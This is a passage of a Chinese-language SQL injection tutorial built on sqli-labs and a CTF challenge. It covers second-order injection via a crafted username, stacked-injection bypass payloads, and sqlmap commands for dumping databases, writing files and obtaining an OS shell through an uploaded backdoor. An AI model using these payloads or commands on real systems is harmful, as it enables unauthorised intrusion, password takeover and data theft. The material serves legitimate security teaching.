的点就是：<strong>他不是我们输入 username 的方式去接收该参数的</strong></p>\n</li>\n<li>\n<p><strong>也就是说这里他不会对 <code>username</code> 的值做任何转义操作</strong>，所以假设我的用户名是 <code>admin' #</code>，那么他的更新语句就会变成：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE users SET PASSWORD=<span class=\"string\">&#x27;123456&#x27;</span> where username=<span class=\"string\">&#x27;admin&#x27;</span> <span class=\"comment\"># &#x27; and password=&#x27;admin123&#x27;;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>那么实际执行的 SQL 语句就是 <code>UPDATE users SET PASSWORD='123456' where username='admin'</code>，将 <code>admin</code> 用户的密码更改为了 <code>123456</code>，那我们就可以直接登录了</p>\n</li>\n<li>\n<p>好，现在思路有了，我们就找一找哪里能够让我们的 <code>SESSION</code> 中 <code>username</code> 为 <code>admin' #</code></p>\n</li>\n<li>\n<p>那这里刚好有注册按钮，又看一看注册用户的源码 <code>login_create.php</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断用户名是否已存在</span></span><br><span class=\"line\"><span class=\"variable\">$username</span>=  <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) ;  </span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;re_password&#x27;</span>]);  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"comment\">// 查询用户名是否已存在</span></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select count(*) from users where username=&#x27;<span class=\"subst\">$username</span>&#x27;&quot;</span>;  </span><br><span class=\"line\"><span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);  </span><br><span class=\"line\"><span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_row</span>(<span class=\"variable\">$res</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果用户名已存在</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"variable\">$row</span>[<span class=\"number\">0</span>]== <span class=\"number\">0</span>)  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"comment\">// 不重要的代码</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果用户名不存在 ==&gt; 重要的点在这里</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">\t    <span class=\"comment\">// 更新数据SQL语句！</span></span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into users ( username, password) values(\\&quot;<span class=\"subst\">$username</span>\\&quot;, \\&quot;<span class=\"subst\">$pass</span>\\&quot;)&quot;</span>;  </span><br><span class=\"line\">        <span class=\"comment\">// 其他代码</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">\t    <span class=\"comment\">// 其他代码</span></span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到这里仍然有转义语句，所以也没办法注入，但是这也说明了我可以注册带有特殊字符的名字</p>\n</li>\n<li>\n<p>所以我们注册用户 <code>admin' #</code>，密码为 <code>123456</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/570a81cea25c428fbf104569cd5634b2.png\" alt=\"\"></p>\n</li>\n<li>\n<p>那么我们再利用这个账号登录，让 <code>username</code> 存入 SESSION 中，然后修改密码，不就可以实现我们的设想了吗？</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/d67e7da5c7e3488ab192c473721ad58a.png\" alt=\"\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/f72e6e5f55eb4c1091476767856af56e.png\" alt=\"\"></p>\n</li>\n<li>\n<p>好，现在成功登录，然后我们修改密码为 <code>12345</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/00e9534e9b2d4e40ac21f1f3d235f6de.png\" alt=\"\"></p>\n</li>\n<li>\n<p>这时候按我们的推测应该是修改的 <code>admin</code> 的密码，那直接登录一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/4f9beb61b1ec4b1da4d63ff13e48ea5c.png\" alt=\"\"></p>\n</li>\n<li>\n<p>成功登录， 当然了，这里因为他有 <code>die()</code> 函数，那么你是不是可以尝试报错注入啊，把用户名修改成 <code>aa' and updatexml(1,concat(0x7e,(select version()),0x7e),3) #</code> 看一看，但是这里他 <strong>限制了用户名长度</strong>，所以 pass</p>\n</li>\n<li>\n<p>总的来说，如果要形成二次注入，需要满足以下条件：</p>\n<ul>\n<li>业务逻辑中数据是 <strong>先插后取</strong> 的</li>\n<li>数据插入时有 <strong>转义函数</strong>（<code>mysql_escape_string()</code>、<code>addslashes()</code>）</li>\n<li>后续 <strong>查询/更新</strong> 其他数据需要用到插入的数据</li>\n</ul>\n</li>\n<li>\n<p>可以看到二次注入需要满足的条件还是很苛刻的，所以实战中很少用到，需要测试的点太多了</p>\n</li>\n<li>\n<p>测试思路：</p>\n<ul>\n<li>黑盒测试：分析功能有添加后对数据操作的地方（功能点）</li>\n<li>白盒测试：insert 后进入 select 或 updata 的功能的代码块</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"2-堆叠注入\">2.堆叠注入</h5>\n<ul>\n<li>\n<p>堆叠注入，也很简单，就是 <strong>能够同时执行多条恶意 SQL 语句</strong>，每条语句使用 <code>;</code> 隔开</p>\n</li>\n<li>\n<p>原理很简单，但是实战中很难碰到，因为他的触发条件也比较苛刻，需要满足以下条件：</p>\n<ul>\n<li>目标 <strong>存在 SQL 注入</strong> 漏洞</li>\n<li>目标 <strong>不能过滤分号（<code>;</code>）</strong></li>\n<li>目标中间层查询数据库信息时 <strong>可以同时执行多条 SQL 语句</strong></li>\n<li>使用的 <strong>数据库支持堆叠注入</strong>（MySQL、MSSQL、Postgresql 等）</li>\n</ul>\n</li>\n<li>\n<p>在 php 中，需要有 <code>mysqli_multi_query()</code> 函数</p>\n</li>\n<li>\n<p>所以实战中基本碰不到，但 CTF 可能会碰到，如果不打 CTF，那了解原理即可</p>\n</li>\n<li>\n<p>实战案列：BUUCTF 中的 [强网杯 2019 随便注]</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/f2f72b0c41864c12bd88b2db41379076.png\" alt=\"\"></p>\n</li>\n<li>\n<p>判断是字符型还是数字型，输入 <code>1'</code> 会产生报错：</p>\n</li>\n<li>\n<p>判断闭合符为单引号，这里就不尝试其他的注入方法了，直接堆叠注入，<code>payload</code> 为 <code>';show databases;#</code>“：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/036d193e875e4e1c8e9f2a33f5e9fa76.png\" alt=\"\"></p>\n</li>\n<li>\n<p>出库名了，然后看一下 <code>show tables</code> 表名：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/14c61a7f1a6047ff82fe86e101d1175d.png\" alt=\"\"></p>\n</li>\n<li>\n<p>然后尝试 <code>select * from 191xxx</code> 读取第一个表的值：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/cd7ea3b66b5e48faa728a497e8859258.png\" alt=\"\"></p>\n</li>\n<li>\n<p>提示不让用 select，那就尝试绕过吧，这里绕过语句为 <code>1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p>\n</li>\n<li>\n<p>成功拿到 flag</p>\n</li>\n<li>\n<p>payload 的由来可以看：<a href=\"https://blog.csdn.net/m0_73734159/article/details/134049744\">https://blog.csdn.net/m0_73734159/article/details/134049744</a></p>\n</li>\n</ul>\n<h4 id=\"五、SQLMAP-的使用\">五、SQLMAP 的使用</h4>\n<ul>\n<li><code>sqlmap</code> 是一款开源的渗透测试工具，可以 <strong>自动化</strong> 进行 <strong>SQL 注入</strong> 的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎, 为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</li>\n<li>详细资料：<a href=\"https://www.cnblogs.com/bmjoker/p/9326258.html\">https://www.cnblogs.com/bmjoker/p/9326258.html</a></li>\n</ul>\n<h5 id=\"1-基础语句\">1.基础语句</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://xxx&quot;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-判断当前数据库的信息\">2.判断当前数据库的信息</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--current-user : 查看当前数据库用户</span><br><span class=\"line\">--privileges : 查看当前用户权限</span><br><span class=\"line\">--is-dba : 查看当前用户是否为管理员</span><br></pre></td></tr></table></figure>\n<h5 id=\"3-获取数据库的敏感信息\">3.获取数据库的敏感信息</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--current-db : 获取当前数据库名称</span><br><span class=\"line\">--tables : 获取所有数据库下的所有表名</span><br><span class=\"line\">--tables -D &quot;&quot; : 获取指定数据库名下的表名</span><br><span class=\"line\">--columns -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下的列名</span><br><span class=\"line\">--dump -C &quot;&quot; -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下，指定列名下的数据</span><br></pre></td></tr></table></figure>\n<h5 id=\"4-文件读取\">4.文件读取</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--file-read &quot;&quot; : 读取目标文件</span><br><span class=\"line\">--file-write &quot;&quot; --file-dest &quot;&quot; : 将本地文件写入服务器目标文件</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>这里需要满足的条件：</p>\n<ul>\n<li>网站必须是 root 权限</li>\n<li>具有读写权限（比如 mysql 需要关闭 secure_file_priv）</li>\n<li>需要知道网站的绝对路径</li>\n</ul>\n</li>\n<li>\n<p>比如使用 <code>--file-read</code> 读取 <code>D:\\\\1.txt</code> 文件：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/49916ba78c004b50852542c4b1ae9b4d.png\" alt=\"\"></p>\n</li>\n<li>\n<p>这里它就帮我们下载好了放到了 <code> C:\\用户\\用户名\\AppData\\Local\\sqlmap\\output\\sqli.labs\\files\\D__1.txt</code> 下，直接查看：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/6e57bbaf705d4bca831cb10ffedcf215.png\" alt=\"\"></p>\n</li>\n<li>\n<p>然后我们尝试使用 <code>--file-write</code> 和 <code>--file-dest</code> 上传一个文件到目标服务器：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://sqli.labs:<span class=\"number\">8889</span>/Less-<span class=\"number\">1</span>/?id=<span class=\"number\">1</span>&quot; --file-write &quot;D:\\\\<span class=\"number\">1</span>.txt&quot; --file-dest &quot;D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs\\\\<span class=\"number\">1</span>.txt&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/35f86bbfa0194535b7edd01e233266f7.png\" alt=\"\"></p>\n</li>\n<li>\n<p>最后没有 [WARNING] 这种局警告就算上传成功</p>\n</li>\n</ul>\n<h5 id=\"5-命令执行\">5.命令执行</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. --sql-shell : 执行sql命令</span><br><span class=\"line\">2. --os-cmd=xx : 执行指定cmd命令</span><br><span class=\"line\">3. --os-shell : 系统交互命令</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>这里如果是 mysql、postgresql、microsoft sql server，优势可以直接获取权限执行任意命令</p>\n</li>\n<li>\n<p>需要满足的条件：</p>\n<ul>\n<li>网站必须是 root 权限</li>\n<li>攻击者需要知道网站的绝对路径</li>\n<li>GPC 为 off , php 主动转义的功能关闭</li>\n</ul>\n</li>\n<li>\n<p>比如执行 <code>sql</code> 命令，直接获取 <code>users</code> 表的所有信息：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/ed9d91733a1344609856d1a2f6498890.png\" alt=\"\"></p>\n</li>\n<li>\n<p>还有可以尝试能不能执行主机 <code>cmd</code> 命令，比如执行 <code>--os-cmd=calc</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/ed3f2ca293f544bb96acc43414282c8a.png\" alt=\"\"></p>\n</li>\n<li>\n<p>中途会问你网站使用的是哪种开发语言，默认为 <code>ASP</code>，我们选择 <code>PHP</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/831bf1695bd44909bf399592038946fc.png\" alt=\"\"></p>\n</li>\n<li>\n<p>因为执行目标指令，其实就相当于上传一个后门文件，所以 <strong>需要知道当前网站的根目录</strong>，因此它会问你是否尝试披露网站的完整路径，一律回车即可：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/264b2451a3a14f97bb54b003ef05fb98.png\" alt=\"\"></p>\n</li>\n<li>\n<p>这里它没有成功弄出路径，然后我们这里选 2 手动指定一下它的根目录：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/3cc2de3e15a849afb63939aab795d894.png\" alt=\"\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/1251b36824e9435dbdc63a59fd821826.png\" alt=\"\"></p>\n</li>\n<li>\n<p>这里可以看到它已经成功上传了后门到指定的根目录，回车：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/0c599d09450e4f02ab4a2f5e654c0019.png\" alt=\"\"></p>\n</li>\n<li>\n<p>成功弹出计算器，需要注意，这里 <strong>最好是把杀软关掉</strong></p>\n</li>\n<li>\n<p>同理，也可以直接执行 <code>--os-shell</code> 尝试直接拿到主机权限：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/6579341e88964a54a60ff668be8f6beb.png\" alt=\"\"></p>\n</li>\n</ul>\n<h5 id=\"6-提交方式\">6.提交方式</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--data &quot;&quot; : 通过POST发送数据</span><br><span class=\"line\">--cookie &quot;&quot; : cookie注入</span><br><span class=\"line\">-r &quot;&quot; : 通过数据包注入</span><br><span class=\"line\">* : 标记需要注入的参数位置</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>除了 <code>--data</code>，我们还可以直接抓包整个请求体，然后通过 <code>*</code> 标记需要注入的位置，来处理 POST 注入：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/Less-11/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>sqli.labs:8889</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>30</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span><span class=\"punctuation\">: </span>max-age=0</span><br><span class=\"line\"><span class=\"attribute\">Origin</span><span class=\"punctuation\">: </span>http://sqli.labs:8889</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Referer</span><span class=\"punctuation\">: </span>http://sqli.labs:8889/Less-11/</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-apache\"><span class=\"attribute\">uname</span>=<span class=\"number\">1</span>*&amp;passwd=<span class=\"number\">1</span>*&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后将这个数据包保存到一个 <code>.txt</code> 文件中，使用 <code>-r</code> 注入：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r &quot;D:\\\\1.txt&quot; --dbs</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"7-绕过方法\">7.绕过方法</h5>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--tamper=xxx.py : 使用指定的脚本</span><br><span class=\"line\">--tamper=1.py,2.py... : 批量使用脚本</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>有些网站传递的参数可能是经过编码或者加密过的，而 <code>Sqlmap</code> 的 <code>payload</code> 是没有编码或者加密的，那这时我们再通过刚刚的注入是无法注入的</p>\n</li>\n<li>\n<p>这时候我们就需要使用一些脚本工具对 <code>Sqlmap</code> 的 <code>payload</code> 进行一些处理</p>\n</li>\n<li>\n<p>在 <code>sqlmap/tamper/</code> 目录下有一些常用的 <code>py</code> 脚本处理 <code>payload</code>，比如进行 <code>Base64</code> 编码、二进制编码、转为小写等等</p>\n</li>\n<li>\n<p>这里以 Sqli-labs 第一关为例，我们对源代码进行一些处理，修改为如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$id</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>现在需要输入 <code>id</code> 为 <code>base64</code> 编码后的结果才能正常解析：</p>\n</li>\n<li>\n<p>此时我们使用 Sqlmap 正常注入肯定是不行的，可以自己下去尝试；我们这里指定脚本为自带的 <code>base64encode.py</code>：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ==&quot; --tamper=base64encode --dbs</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>成功绕过注入</p>\n</li>\n<li>\n<p>现在，我们再修改一下源代码，将 <code>base64_decode</code> 去掉，添加过滤机制：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;select&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;SELECT&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;sleep&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;SLEEP&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;elt&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;ELT&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;and&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;AND&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;or&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;OR&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;xor&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;XOR&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里我们将敏感关键字大小写全部替换为空字符，然后 <strong>清除刚才的缓存</strong>，再使用 <code>Sqlmap</code> 跑一遍：</p>\n</li>\n<li>\n<p>发现是跑不出来东西的，假设我们手工注入已经知道了他的一个绕过方式，可以使用双写或者大小写绕过，这时候我们就可以自己编写 <code>Tamper</code> 脚本来处理 payload</p>\n</li>\n<li>\n<p>比如这里我就采用大小写绕过，首先复制一个原本的 <code>tamper</code> 脚本文件，将注释删除：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dependencies</span>():</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tamper</span>(<span class=\"params\">payload, **kwargs</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后在 <code>tamper()</code> 函数中写入我们的绕过规则，这里使用 <code>str.replace()</code> 函数替换 <code>payload</code> 中的敏感关键字：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dependencies</span>():</span><br><span 